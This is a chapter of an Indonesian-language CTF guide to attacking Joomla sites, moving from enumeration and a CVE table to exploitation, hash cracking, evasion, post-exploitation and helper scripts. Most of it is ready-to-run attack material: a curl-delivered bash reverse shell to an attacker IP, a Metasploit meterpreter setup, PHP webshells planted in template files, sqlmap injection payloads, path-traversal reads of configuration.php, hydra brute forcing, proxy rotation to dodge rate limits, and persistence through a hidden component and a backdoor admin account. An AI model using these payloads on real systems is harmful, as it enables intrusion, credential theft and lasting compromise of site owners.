---
id: "17b"
title: "📘 17b — Joomla Workflow: Deep Dive untuk CTF"
category: "3. Web Exploitation"
categoryId: "web"
filename: "17b_Joomla_workflow.md"
refs_out: ["05","06","07","12","14a","17a","17c","44"]
refs_in: ["15","17","17a","17d","62"]
---

# 📘 17b — Joomla Workflow: Deep Dive untuk CTF

> **File Sebelumnya:** [17a — WordPress Workflow](/docs/wordpress)  
> **File Berikutnya:** [17c — Drupal Workflow](/docs/drupal-cms)

---

## 📑 Daftar Isi
1. [Joomla Architecture](#-bagian-1-joomla-architecture)
2. [Enumeration](#-bagian-2-enumeration)
3. [Vulnerability Patterns](#-bagian-3-vulnerability-patterns)
4. [Exploitation Paths](#-bagian-4-exploitation-paths)
5. [Hash Cracking](#-bagian-5-hash-cracking)
6. [JoomScan Workflow](#-bagian-6-joomscan-workflow)
7. [WAF Bypass & Evasion](#-bagian-7-waf-bypass--evasion)
8. [Post-Exploitation](#-bagian-8-post-exploitation)
9. [Automation Scripts](#-bagian-9-automation-scripts)
10. [Common Errors](#-bagian-10-common-errors)
11. [Cheatsheet](#-bagian-11-cheatsheet)
12. [Lanjut ke File Berikutnya](#-lanjut-ke-file-berikutnya)

---

## 🧱 Bagian 1: Joomla Architecture

### 1.1 Perbedaan Joomla vs WordPress

| Aspek | Joomla | WordPress |
|---|---|---|
| **Config file** | `/configuration.php` (root) | `/wp-config.php` (root) |
| **Admin panel URL** | `/administrator/` | `/wp-admin/` atau `/wp-login.php` |
| **Plugin/Extension** | Components, Modules, Plugins (MVC) | Plugins & Themes |
| **Theme/Template** | `/templates/` (biasanya multiple) | `/wp-content/themes/` |
| **DB table prefix** | Default `jos_` (bisa custom) | Default `wp_` |
| **Hash algorithm** | bcrypt (Joomla 3+) / MD5+salt (lama) | phpass (WordPress 3+) |
| **Scanner tool** | JoomScan, CMSmap, JoomlaScan | WPScan |
| **Common attack vectors** | CVE-2023-23752 API leak, component SQLi/RCE, template RCE, password reset abuse | Plugin/theme vuln, XML-RPC, wp-cron, weak passwords |

### 1.2 Struktur Direktori Joomla

```text
/ (root)
├── administrator/     # Admin panel (login, components admin)
├── components/        # Front-end components (MVC)
├── modules/           # Sidebar/widget modules
├── plugins/           # System plugins (authentication, editors, etc.)
├── templates/         # Theme templates (front-end & admin)
├── libraries/         # Core libraries (Joomla framework)
├── cache/             # Cache files (kadang writable → potensi poisoning)
├── logs/              # Log files (info disclosure, path leak)
├── tmp/               # Temporary upload folder (writable)
├── images/            # Media files
├── media/             # Static assets (JS, CSS)
├── language/          # Language packs (version disclosure via XML)
├── configuration.php  # 🔴 FILE PALING PENTING (DB creds, secret)
├── index.php          # Front-end entry point
├── .htaccess          # Apache rewrite rules (bisa di-modify)
└── robots.txt         # Kadang berisi path sensitif
```

### 1.3 `configuration.php` — File Paling Penting

Contoh realistis (Joomla 4.x):

```php
<?php
class JConfig {
    public $dbtype = 'mysqli';
    public $host = 'localhost';
    public $user = 'joomla_user';
    public $password = 'Sup3rSecretDBpass!';
    public $db = 'joomla_db';
    public $dbprefix = 'jos_';
    public $secret = 'aB3dEfGhIjKlMnOpQrStUvWxYz123456'; // Session secret
    public $log_path = '/var/www/html/administrator/logs';
    public $tmp_path = '/var/www/html/tmp';
    public $live_site = 'http://target.com';
    // ... banyak lainnya
}
?>
```

**Cara exploit tiap field jika file terbaca:**
- **`$user` & `$password`** → Login ke MySQL (jika remote MySQL dibuka atau melalui shell). Dari DB, ambil hash admin.
- **`$secret`** → Digunakan untuk validasi session token & Remember Me cookies. Bisa dipakai untuk forge session sebagai admin (Joomla < 3.4.6 vulnerability).
- **`$log_path` / `$tmp_path`** → Mengetahui path absolut untuk LFI/RFI atau menulis file.
- **`$live_site`** → Konfirmasi target URL.
- **`$dbprefix`** → Penting untuk SQL injection (tabel prefix custom).

### 1.4 Joomla Database Structure

Tabel penting (prefix default `jos_`):

| Tabel | Isi |
|---|---|
| `#__users` | `id`, `name`, `username`, `email`, `password` (hash) |
| `#__user_usergroup_map` | Mapping user → group id |
| `#__usergroups` | Grup: 1=Public, 7=Administrator, 8=Super Users |
| `#__extensions` | Installed components/modules/plugins, status |
| `#__session` | Active sessions (session_id, userid) |
| `#__content` | Artikel |
| `#__categories` | Kategori konten |

**SQL query ekstrak admin:**

```sql
SELECT u.id, u.username, u.email, u.password, g.title AS group_name
FROM jos_users u
JOIN jos_user_usergroup_map m ON u.id = m.user_id
JOIN jos_usergroups g ON m.group_id = g.id
WHERE g.id IN (7,8); -- 7=Administrator, 8=Super Users
```

---

## 🔍 Bagian 2: Enumeration

### 2.1 JoomScan Deep Dive

**Install di Parrot OS:**

```bash
# JoomScan sudah ada di repositori? Jika belum:
sudo apt update && sudo apt install joomscan -y

# Atau dari GitHub:
git clone https://github.com/rezasp/joomscan.git
cd joomscan && chmod +x joomscan.pl
```

**Flag penting:**

```bash
joomscan -u http://$TARGET            # Basic scan
joomscan -u http://$TARGET -ec        # Enumerate components
joomscan -u http://$TARGET -et        # Enumerate templates
joomscan -u http://$TARGET -ep        # Enumerate plugins
joomscan -u http://$TARGET -x         # Scan with all checks (verbose)
joomscan -u http://$TARGET -r         # Show response headers
joomscan -u http://$TARGET -o report.txt  # Save output to file
```

**Cara baca output:**
- **`[+] Target: ...`** → Target URL.
- **`[+] Server: Apache/2.4.41 (Ubuntu)`** → Informasi server.
- **`[+] Joomla version: 4.2.6`** → Versi terdeteksi (penting untuk CVE).
- **`[++] Interesting headers found: ...`** → Header sensitif.
- **`[++] Admin page: ...`** → URL admin.
- **`[+] Core Joomla Vulnerability: ...`** → CVE yang applicable.
- **`[+] Component Vulnerability: ...`** → CVE komponen.

### 2.2 Manual Enumeration Tanpa JoomScan

**Deteksi Versi Joomla (4 Metode):**

```bash
TARGET="http://target.com"

# Method A: /administrator/manifests/files/joomla.xml
curl -s "$TARGET/administrator/manifests/files/joomla.xml" | grep -oP '(?<=<version>)[^<]+'

# Method B: /language/en-GB/en-GB.xml
curl -s "$TARGET/language/en-GB/en-GB.xml" | grep -oP '(?<=<version>)[^<]+'

# Method C: /README.txt
curl -s "$TARGET/README.txt" | head -20

# Method D: Meta generator tag di HTML
curl -s "$TARGET" | grep -i 'generator'
```

**Deteksi Komponen Joomla:**

```bash
# Dari HTML: cari link ke option=com_xxx
curl -s "$TARGET" | grep -oP 'com_[a-z0-9_]+' | sort -u

# Directory fuzzing /components/ dengan ffuf/gobuster
ffuf -u "$TARGET/components/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/CMS/joomla-components.txt -mc 200,301,302

# Akses langsung: /index.php?option=com_<component>
curl -s -I "$TARGET/index.php?option=com_users"
```

**Deteksi Plugins:**

```bash
# Cek direktori plugins
curl -s -I "$TARGET/plugins/system/"

# Path umum: /plugins/system/, /plugins/authentication/, /plugins/content/
ffuf -u "$TARGET/plugins/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

**Deteksi Templates:**

```bash
# Direktori templates
curl -s -I "$TARGET/templates/"

# Deteksi template aktif dari HTML
curl -s "$TARGET" | grep -oP 'templates/[a-z0-9_]+' | sort -u
```

### 2.3 User Enumeration

**Method A: Login error message disclosure (Dengan CSRF Token)**

```bash
# Step 1: Ambil form token CSRF terlebih dahulu dari halaman login
TOKEN=$(curl -s -c cookies.txt "$TARGET/index.php?option=com_users&view=login" | grep -oP '[a-f0-9]{32}=1' | head -1 | cut -d'=' -f1)
echo "[*] Form Token: $TOKEN"

# Step 2: Kirim POST login request menyertakan token CSRF
curl -s -b cookies.txt -c cookies.txt   -d "username=admin&passwd=wrongpassword&option=com_users&task=user.login&return=aW5kZXgucGhw&${TOKEN}=1"   "$TARGET/index.php" | grep -iE "username|invalid|error|alert"
# Bandingkan error: "Username tidak ditemukan" vs "Password salah"
# Jika pesan berbeda, username valid terkonfirmasi.
```

**Method B: Registration page**

```bash
curl -s "$TARGET/index.php?option=com_users&view=registration" | grep -i "user"
# Coba daftar dengan username yang sudah ada → error "username sudah dipakai"
```

**Method C: API endpoint (Joomla 4.x)**

```bash
# Endpoint publik user list (tanpa auth, tergantung konfigurasi)
curl -s "$TARGET/api/index.php/v1/users" | jq .
# Jika API diaktifkan tanpa auth, akan tampil daftar user.
```

**Method D: Feed endpoints**

```bash
# Feed artikel sering menampilkan author name
curl -s "$TARGET/index.php?format=feed&type=rss" | grep -oP '<dc:creator>[^<]+' | cut -d'>' -f2
```

### 2.4 Joomla 4.x API (Baru & Sering di CTF Modern)

**Endpoint API:**

```bash
TARGET="http://target.com"

# Config application (dapat memuat informasi sensitif tanpa auth di versi rentan CVE-2023-23752)
curl -s "$TARGET/api/index.php/v1/config/application" | jq .

# Users list (jika API enabled dan tidak proteksi)
curl -s "$TARGET/api/index.php/v1/users" | jq .

# Menu items
curl -s "$TARGET/api/index.php/v1/menus/site/items" | jq .
```

**Autentikasi API:**

```bash
# Login ke API menggunakan kredensial yang valid (Joomla 4)
# Dapatkan token:
curl -X POST "$TARGET/api/index.php/v1/users/login"   -H "Content-Type: application/json"   -d '{"username":"admin","password":"password"}'

# Gunakan token di header:
curl -s "$TARGET/api/index.php/v1/users"   -H "Authorization: Bearer <token>" | jq .
```

---

## 🧨 Bagian 3: Vulnerability Patterns

### 3.1 CVE Table Joomla Core (Minimal 10 CVE)

| Versi | CVE | Deskripsi | CVSS | Vector |
|---|---|---|---|---|
| Joomla 4.0.0 - 4.2.7 | CVE-2023-23752 | Unauthorized API Access (Bypass auth to read config) | 7.5 | `/api/index.php/v1/config/application` |
| Joomla 3.7.0 | CVE-2017-8917 | SQL Injection di com_fields | 9.8 | `/index.php?option=com_fields` |
| Joomla 1.5.0 - 3.4.5 | CVE-2015-8562 | PHP Object Injection via User-Agent | 9.8 | User-Agent header di HTTP request |
| Joomla 3.2.0 - 3.4.4 | CVE-2015-7857 | SQL Injection di com_contenthistory | 9.8 | `/index.php?option=com_contenthistory` |
| Joomla 3.0.0 - 3.4.6 | CVE-2015-8566 | Session Hardening Bypass (Forge session) | 7.5 | Cookie Remember Me |
| Joomla 3.9.0 - 3.9.4 | CVE-2019-10945 | Directory Traversal di com_media | 5.3 | `path` parameter di com_media |
| Joomla 1.5 - 3.4.5 | CVE-2016-8869 | Privilege Escalation via User Registration | 8.8 | Crafted registration form fields |
| Joomla 3.6.0 | CVE-2016-9086 | Information Disclosure / Traversal di com_media (Admin) | 5.3 | Media manager preview via admin |
| Joomla 3.8.0 - 3.9.0 | CVE-2019-7739 | SSRF di com_ajax | 7.5 | `/index.php?option=com_ajax` |
| Joomla 4.0.0 - 4.1.0 | CVE-2022-27917 | SQL Injection di API endpoint | 9.8 | REST API query parameters |
| Joomla 1.6 - 3.4.5 | CVE-2016-9838 | ACL Bypass di com_content | 8.1 | `/index.php?option=com_content` |

### 3.2 Component Vulnerabilities (CTF Common)

| Component | CVE | Type | Command/PoC |
|---|---|---|---|
| com_fields | CVE-2017-8917 | SQLi | `sqlmap -u "$TARGET/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=extractvalue(1,concat(0x7e,database()))"` |
| JCE Editor | CVE-2017-8338 | File Upload RCE | Upload shell via JCE file browser |
| com_media | CVE-2019-10945 | Directory Traversal | `curl "$TARGET/index.php?option=com_media&view=images&tmpl=component&e_name=jform_articletext&asset=file&path=../../../../configuration.php"` |
| com_users | CVE-2016-8869 | PrivEsc | Craft registration to create admin |
| Akeeba Backup | CVE-2014-7228 | File Download | `curl "$TARGET/administrator/components/com_akeeba/backup/akeeba-backup-20141001.zip"` |
| RSForm | CVE-2017-2173 | SQLi | `sqlmap -u "$TARGET/index.php?option=com_rsform&formId=1&task=ajaxValidate"` |
| com_ajax | CVE-2019-7739 | SSRF | `curl -X POST "$TARGET/index.php?option=com_ajax&plugin=...&format=raw"` |
| com_fabrik | CVE-2017-1000157 | SQLi | `sqlmap -u "$TARGET/index.php?option=com_fabrik&view=list&listid=1"` |

### 3.3 Authentication Vulnerabilities

- **Brute force login** → `hydra -l admin -P rockyou.txt $TARGET http-post-form "/administrator/index.php:username=^USER^&passwd=^PASS^&option=com_login&task=login:Incorrect username or password" -t 10`
- **Default credentials** → `admin:admin`, `admin:password`, `admin:123456`
- **Password reset abuse** → CVE-2017-10846 (Joomla 3.7) token reset bisa ditebak.
- **Remember me token abuse** → Jika `$secret` terbaca, dapat forge remember me cookie untuk impersonate admin (Joomla < 3.4.6).

---

## ⚔️ Bagian 4: Exploitation Paths

### 4.1 Path: CVE-2023-23752 → DB Credentials → Admin Access

**Kapan digunakan:** Joomla 4.0.0 s.d. 4.2.7 terdeteksi.

**Flow:**

```text
[Deteksi Joomla 4.x] → [Exploit API endpoint] → [Dapat DB credentials] → [Login MySQL] → [Ambil hash admin] → [Crack/update hash] → [Login admin] → [Template RCE] → [Shell]
```

**Step 1: Deteksi Versi**

```bash
TARGET="http://target.com"
# Cek versi
curl -s "$TARGET/administrator/manifests/files/joomla.xml" | grep -oP '(?<=<version>)[^<]+'
# Atau gunakan joomscan
joomscan -u $TARGET
```

**Step 2: Dump Konfigurasi via API**

```bash
# Endpoint tanpa autentikasi untuk config application
curl -s "$TARGET/api/index.php/v1/config/application" | jq .
```

Contoh output respon rentan:

```json
{
  "links": { "self": "..." },
  "data": [
    {
      "type": "application",
      "id": "configuration",
      "attributes": {
        "user": "root",
        "password": "RootPassword123!",
        "db": "joomla_db",
        "dbprefix": "jos_",
        "secret": "s3cr3tT0k3nHere"
      }
    }
  ]
}
```

**Step 3: Connect ke Database & Ekstrak Hash**

```bash
# Jika MySQL remote dapat diakses (biasanya lewat tunnel atau local)
mysql -h <db_host> -u <user> -p'<password>' <database>

# Dalam MySQL, ambil hash admin:
SELECT id, username, password FROM jos_users WHERE id IN (SELECT user_id FROM jos_user_usergroup_map WHERE group_id IN (7,8));
```

**Step 4: Crack Hash atau Update Password**

```bash
# Hashcat crack
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt

# Atau update password langsung di MySQL (jika punya akses):
# Generate hash bcrypt baru (misal password "pwned123")
php -r 'echo password_hash("pwned123", PASSWORD_BCRYPT);'

# Copy hash yang dihasilkan, lalu update ke database:
mysql -e "UPDATE jos_users SET password='<new_bcrypt_hash>' WHERE id=42;" -u <user> -p'<pass>' <db>
```

**Step 5: Login ke Admin Panel**

```bash
# Buka browser atau gunakan curl
# Simpan cookie, verifikasi dengan akses dashboard
curl -s -c cookies.txt -d "username=admin&passwd=pwned123&option=com_login&task=login" "$TARGET/administrator/index.php"
curl -s -b cookies.txt "$TARGET/administrator/index.php" | grep "Dashboard"
```

**Step 6: RCE via Template Editor**

```bash
# Akses template editor: Extensions > Templates > Templates > (pilih template aktif) > index.php
# Atau langsung via URL (tergantung template)
# Contoh: edit file index.php pada template protostar
# Tambahkan payload PHP reverse shell di paling atas:
# <?php system($_GET['cmd']); ?>
# Simpan, lalu akses:
curl "$TARGET/templates/protostar/index.php?cmd=id"

# Atau kirim reverse shell penuh ke listener:
curl "$TARGET/templates/protostar/index.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<attacker-ip>/4444+0>%261'"
```

**Decision Tree Eksploitasi:**

```text
[1] Detect Version
         │
         ├── Version 4.0.0 - 4.2.7 ──> CVE-2023-23752 (API Leak) ──> DB Creds ──> MySQL
         │                                                                             │
         │                                                            ┌────────────────┴────────────────┐
         │                                                            ▼                                 ▼
         │                                                     [Crack bcrypt]                  [Update Hash di DB]
         │                                                            │                                 │
         │                                                            └────────────────┬────────────────┘
         │                                                                             ▼
         │                                                                      [Login Admin]
         │                                                                             │
         │                                                                             ▼
         │                                                                      [Template RCE]
         │
         ├── Version 3.7.0 ─────────> CVE-2017-8917 (SQLi) ───────> Dump users ─────> Crack Hash ──> Login Admin ──> Template RCE
         │
         ├── Version < 3.4.6 ────────> CVE-2015-8562 (User-Agent Object Injection) ──> Direct Shell (Pre-Auth)
         │
         └── Component Vulnerable ──> Searchsploit ──> Exploit Component ─────────────> Shell
```

---

### 4.2 Path: Unauthenticated → Shell (Pre-Auth RCE)

**Kapan digunakan:** Joomla < 3.4.6, CVE-2015-8562 (PHP Object Injection). Atau jika ada component vulnerable dengan pre-auth RCE.

**CVE-2015-8562 (PHP Object Injection):**

```bash
TARGET="http://target.com"

# Exploit menggunakan script python/metasploit
# Contoh pakai metasploit:
msfconsole -q
use exploit/multi/http/joomla_http_header_rce
set RHOSTS target.com
set RPORT 80
set TARGETURI /
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST <attacker-ip>
set LPORT 4444
run

# Atau manual dengan python script dari exploit-db:
python exploit_38269.py $TARGET
```

**Flow:**

```text
[Detect version < 3.4.6] → [Run exploit CVE-2015-8562] → [Dapat shell langsung]
```

---

### 4.3 Path: Admin → Shell (Template Editor)

**Kapan digunakan:** Setelah berhasil login ke admin panel (`/administrator/`).

**5 Method berbeda:**

#### 1. Template editor (edit PHP template file)

```bash
# ✅ URL LANGSUNG ke Template Editor Joomla:
# Format URL Template Editor Joomla 3.x:
# "$TARGET/administrator/index.php?option=com_templates&view=template&id=<TEMPLATE_ID>&file=<BASE64_ENCODED_FILENAME>"

# Cek template aktif dan ID gayanya via styles:
curl -s -b cookies.txt   "$TARGET/administrator/index.php?option=com_templates&view=styles"   | grep -oP 'id=[0-9]+' | head -5

# Template default yang paling sering ditemukan di CTF Joomla:
# - protostar (Joomla 3.x default)
# - beez3 (Joomla 3.x)
# - cassiopeia (Joomla 4.x default)

# Path template file yang bisa diedit:
# Joomla 3: $TARGET/templates/protostar/index.php
# Joomla 4: $TARGET/templates/cassiopeia/index.php

# Cara edit via Web GUI (Rekomendasi CTF Praktis):
# 1. Login ke /administrator/
# 2. Masuk ke: System -> Site Templates (Joomla 4) atau Extensions -> Templates -> Templates (Joomla 3)
# 3. Klik template aktif (misal 'Protostar Details and Files')
# 4. Klik file 'index.php'
# 5. Sisipkan: <?php system($_GET['cmd']); ?> di baris paling atas setelah tag <?php
# 6. Klik tombol 'Save & Close'
# 7. Trigger shell:
curl "$TARGET/index.php?cmd=id"
# atau akses path file langsung:
curl "$TARGET/templates/protostar/index.php?cmd=id"
```

#### 2. Media manager upload

```bash
# Upload file .php yang sudah disamarkan (misal .php.jpg dengan bypass MIME)
# Atau gunakan ekstensi yang diizinkan tapi punya eksekusi (misal .phtml)
# Setelah upload, file berada di /images/
curl "$TARGET/images/shell.php?cmd=id"
```

#### 3. Install extension (malicious ZIP)

```bash
# Buat paket extension berisi file shell.php di root
# Upload via Extensions → Install → Upload Package File
# Setelah install, akses file di /components/ atau /modules/
```

#### 4. `com_media` path traversal (CVE-2019-10945) — jika versi rentan

```bash
# Tanpa perlu admin penuh, dapat membaca file
curl "$TARGET/index.php?option=com_media&view=images&tmpl=component&e_name=jform_articletext&asset=file&path=../../../../configuration.php"
# Untuk menulis, perlu dikombinasikan dengan upload
```

#### 5. Configuration file modification

```bash
# Edit configuration.php untuk mengubah tmp_path ke direktori web, lalu upload shell via tmp
# Atau tambahkan kode PHP di file config (jika bisa edit)
```

**Cara upgrade ke reverse shell:**

```bash
# Setelah dapat eksekusi via cmd, gunakan:
bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
# Atau upload reverse shell php dan akses
```

---

### 4.4 Path: SQL Injection → Credentials → Shell

**Kapan digunakan:** Joomla 3.7.0 dengan CVE-2017-8917, atau komponen dengan SQLi.

**Flow:**

```text
[Detect SQLi] → [sqlmap dump DB] → [Dapatkan hash admin] → [Crack] → [Login admin] → [Template RCE]
```

**sqlmap command:**

```bash
TARGET="http://target.com"

# CVE-2017-8917
sqlmap -u "$TARGET/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x7e,database()),0)" --dbs

# Dump users table
sqlmap -u "$TARGET/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x7e,(select password from jos_users limit 1)),0)" --dump
```

---

## 🔑 Bagian 5: Hash Cracking

### 5.1 Joomla Password Hash Format

| Versi            | Format                       | Contoh                                                         |
| ---------------- | ---------------------------- | -------------------------------------------------------------- |
| Joomla 1.x - 2.x | MD5(pass.salt) / `hash:salt` | `5f4dcc3b5aa765d61d8327deb882cf99:abcdef123456`                |
| Joomla 3.x - 4.x | bcrypt (`$2y$`)              | `$2y$10$e0MYzXyjpJS7Pd0RVvHwHe1HlCkL2ZB2m1D3r4G5H8n6y6Z2d3c3a` |

**Catatan Teknis Hash Format:**
- **Joomla 1.x - 2.x:** Format di database MySQL adalah `hash:salt`. Attacker cukup menyimpan string ini apa adanya ke file `hash.txt`. Algoritmanya adalah `md5($pass.$salt)`. Mode Hashcat yang tepat adalah `-m 3721` (Joomla < 2.5.18). Mode `-m 3710` adalah `md5($salt.md5($pass))` yang berbeda dan keliru.
- **Joomla 3+:** Menggunakan bcrypt dengan cost factor 10 (`$2y$10$...`), proses cracking membutuhkan performa CPU/GPU tinggi.

### 5.2 Cracking Commands

**Hashcat:**

```bash
# Joomla 1.x - 2.x: MD5(pass.salt) format
# Hash di DB: 5f4dcc3b5aa765d61d8327deb882cf99:salt123
# Format file hash.txt: hash:salt

# ✅ Mode 3721 (Joomla < 2.5.18 - md5($pass.$salt)):
hashcat -m 3721 hash.txt /usr/share/wordlists/rockyou.txt --force

# Atau jika format salt.pass:
hashcat -m 20 hash.txt /usr/share/wordlists/rockyou.txt --force

# Joomla 3+ (bcrypt $2y$):
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt --force
```

**John the Ripper:**

```bash
# Joomla 1.x - 2.x (MD5+salt - lebih fleksibel menggunakan format dynamic_1034):
john --format=dynamic_1034 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Joomla 3+ (bcrypt):
john --format=bcrypt hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Cara extract hash dari database dump:**

```bash
# Dari file SQL dump
grep -A5 "INSERT INTO.*users" dump.sql | grep -oP "'password',\s*'[^']+'" | cut -d"'" -f4

# Atau langsung dari MySQL
mysql -e "SELECT username,password FROM jos_users WHERE username='admin';" -u user -p dbname
```

---

## 🛠️ Bagian 6: JoomScan Workflow

**Workflow lengkap:**

```bash
TARGET="http://target.com"

# 1. Basic scan cepat
joomscan -u $TARGET -o joomla_basic.txt
cat joomla_basic.txt

# 2. Full enumeration (components, plugins, templates)
joomscan -u $TARGET -ec -et -ep -o joomla_enum.txt
cat joomla_enum.txt

# 3. Cek vulnerability core & komponen
joomscan -u $TARGET -x -o joomla_vuln.txt
cat joomla_vuln.txt

# 4. Kombinasi manual
# Setelah dapat versi, cek CVE secara manual
# Coba endpoint API Joomla 4
curl -s "$TARGET/api/index.php/v1/config/application" | jq .
```

**Interpretasi hasil JoomScan:**
- Jika ada CVE core (misal CVE-2023-23752) → langsung ikuti flow di Bagian 4.1.
- Jika ada komponen vulnerable (misal com_fields) → cari exploit di Searchsploit.
- Jika hanya info disclosure → lanjut manual user enumeration.

---

## 🛡️ Bagian 7: WAF Bypass & Evasion

- **Deteksi WAF/security extension di Joomla:**
  - Cek response headers `X-WebFW-Block`, `X-CDN`, dsb.
  - Coba request dengan payload umum, lihat apakah diblokir.
  - Joomla security extensions: RSFirewall, Admin Tools, Akeeba Admin Tools.
- **Bypass rate limiting di login:**
  - Ganti IP dengan proxy (gunakan `proxychains`).
  - Delay antar percobaan (`sleep 2`).
  - Rotate User-Agent.
- **Evasion untuk joomscan:**
  - Gunakan flag `--random-agent` atau `--user-agent "Mozilla/5.0"`.
  - Batasi request per detik (`--delay 2`).
  - Gunakan proxy (`--proxy http://127.0.0.1:8080`).
- **Manipulasi User-Agent:**

```bash
curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" "$TARGET"
# Atau acak tiap request dengan script
```

---

## 🕵️ Bagian 8: Post-Exploitation

### 8.1 Setelah Dapat Shell

```bash
# 1. Extract configuration.php
cat /var/www/html/configuration.php

# 2. Dump database (jika ada mysql client)
mysqldump -u <user> -p<pass> <dbname> > /tmp/db.sql
# atau gunakan php untuk query
php -r 'echo shell_exec("mysql -u user -ppass dbname -e \"SELECT * FROM jos_users\"");'

# 3. Find other credentials
grep -R "password" /var/www/html/ 2>/dev/null | grep -v "\.js"
# Cek file konfigurasi lain
find /var/www -name "*.php" -exec grep -l "password" {} \;

# 4. Check SSH access
cat /etc/passwd | grep -E "sh$|bash$"
ls -la /home/
```

### 8.2 Lateral Movement

```bash
# Password reuse dari configuration.php
# Coba login SSH dengan user/pass dari DB
hydra -L users.txt -P passwords.txt ssh://<target>
# Cek service lain: FTP, SMTP, MySQL
```

### 8.3 Persistence di Joomla

```bash
# 1. Backdoor template file: tambahkan kode di index.php template
echo '<?php if(isset($_GET["x"])){system($_GET["x"]);} ?>' >> /var/www/html/templates/<template>/index.php

# 2. Hidden component: buat folder di components dengan file shell
mkdir /var/www/html/components/com_hidden
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/components/com_hidden/index.php

# 3. Admin account backdoor: insert user baru via MySQL
# Generate hash bcrypt lalu insert ke DB
mysql -e "INSERT INTO jos_users (name, username, email, password, block) VALUES ('Backdoor','backdoor','backdoor@x.com','$2y$10$...',0);"
```

---

## 🤖 Bagian 9: Automation Scripts

### 9.1 Script `joomla_full_audit.sh`

```bash
#!/bin/bash
# joomla_full_audit.sh - Audit Joomla lengkap
# Usage: ./joomla_full_audit.sh http://target.com

if [ -z "$1" ]; then
    echo "Usage: $0 <TARGET_URL>"
    echo "Example: $0 http://10.10.10.187"
    exit 1
fi

TARGET="${1%/}"
OUTDIR="joomla_audit_$(date +%s)"
mkdir -p $OUTDIR
echo "[*] Target: $TARGET"
echo "[*] Output dir: $OUTDIR"

# Deteksi versi via 4 method
echo "[+] Deteksi versi Joomla..."
curl -s "$TARGET/administrator/manifests/files/joomla.xml" | grep -oP '(?<=<version>)[^<]+' | head -1 > $OUTDIR/version.txt
curl -s "$TARGET/language/en-GB/en-GB.xml" | grep -oP '(?<=<version>)[^<]+' | head -1 >> $OUTDIR/version.txt
cat $OUTDIR/version.txt | sort -u

# Cek CVE-2023-23752
echo "[+] Cek endpoint API Joomla 4 (CVE-2023-23752)..."
RESP=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/api/index.php/v1/config/application")
if [ "$RESP" == "200" ]; then
    echo "[!] Endpoint API tersedia! Mencoba dump config..."
    curl -s "$TARGET/api/index.php/v1/config/application" | jq . > $OUTDIR/cve-2023-23752.json
    cat $OUTDIR/cve-2023-23752.json
else
    echo "[-] API endpoint tidak dapat diakses (HTTP $RESP)"
fi

# Enum users via REST API (Joomla 4)
echo "[+] Coba enum users via API..."
curl -s "$TARGET/api/index.php/v1/users" | jq '.data[]?.attributes.username' > $OUTDIR/users.txt 2>/dev/null
cat $OUTDIR/users.txt

# Check sensitive files
echo "[+] Cek file sensitif..."
for file in configuration.php administrator/logs/error.log tmp/ cache/; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/$file")
    echo "  $file => $code"
done

echo "[+] Selesai. Hasil di $OUTDIR"
```

### 9.2 Script `joomla_cve_checker.sh`

```bash
#!/bin/bash
# joomla_cve_checker.sh - Cek CVE berdasarkan versi Joomla (Fixed Version)
# Usage: ./joomla_cve_checker.sh <version>

VERSION="$1"
if [ -z "$VERSION" ]; then
    echo "Usage: $0 <VERSION>"
    echo "Example: $0 4.2.6"
    exit 1
fi

MAJOR=$(echo "$VERSION" | cut -d'.' -f1)
MINOR=$(echo "$VERSION" | cut -d'.' -f2)
PATCH=$(echo "$VERSION" | cut -d'.' -f3)

echo "[*] Checking CVEs untuk Joomla $VERSION..."
echo ""

# Cek Joomla 4.x
if [ "$MAJOR" -eq 4 ] 2>/dev/null; then
    MINOR_NUM=$(echo "$MINOR" | tr -d '[:alpha:]')
    PATCH_NUM=$(echo "$PATCH" | tr -d '[:alpha:]')
    
    # CVE-2023-23752: 4.0.0 - 4.2.7
    if [ "$MINOR_NUM" -le 2 ] &&        { [ "$MINOR_NUM" -lt 2 ] || [ "$PATCH_NUM" -le 7 ]; }; then
        echo "[!!!] CVE-2023-23752 - Unauthorized API Access (CRITICAL)"
        echo "      curl -s \$TARGET/api/index.php/v1/config/application"
    fi
fi

# Cek Joomla 3.x
if [ "$MAJOR" -eq 3 ] 2>/dev/null; then
    echo "[+] Joomla 3.x terdeteksi, checking CVEs..."
    echo "    CVE-2017-8917 (SQLi - Joomla 3.7.0) - cek versi exact"
    echo "    CVE-2015-8562 (RCE) - jika versi < 3.4.6"
    echo "    CVE-2019-10945 (Dir Traversal) - jika versi < 3.9.4"
fi

echo ""
echo "[*] Untuk CVE detail: searchsploit joomla $VERSION"
echo "[*] Atau: searchsploit joomla $MAJOR.$MINOR"
```

### 9.3 One-liner Quick Checks

```bash
TARGET="http://target.com"

# Version detect
curl -s "$TARGET/administrator/manifests/files/joomla.xml" | grep -oP '(?<=<version>)[^<]+'

# Admin panel confirm
curl -s -o /dev/null -w "%{http_code}" "$TARGET/administrator/"

# CVE-2023-23752 quick test
curl -s "$TARGET/api/index.php/v1/config/application" | jq . >/dev/null 2>&1 && echo "Vulnerable" || echo "Not vulnerable"

# Config file check
curl -s -o /dev/null -w "%{http_code}" "$TARGET/configuration.php"

# User enum via API (Joomla 4)
curl -s "$TARGET/api/index.php/v1/users" | jq -r '.data[].attributes.username' 2>/dev/null
```

---

## ⚠️ Bagian 10: Common Errors

| Error | Sebab | Solusi |
|---|---|---|
| JoomScan tidak terinstall | Package tidak ada di repo | Clone dari GitHub: `git clone https://github.com/rezasp/joomscan.git` |
| `/administrator` 403 dari IP luar | IP whitelist / proteksi | Coba via VPN/proxy, atau cari path alternatif |
| CVE-2023-23752 tidak bekerja | Versi bukan 4.0.0-4.2.7 | Cek versi, coba CVE lain atau component vuln |
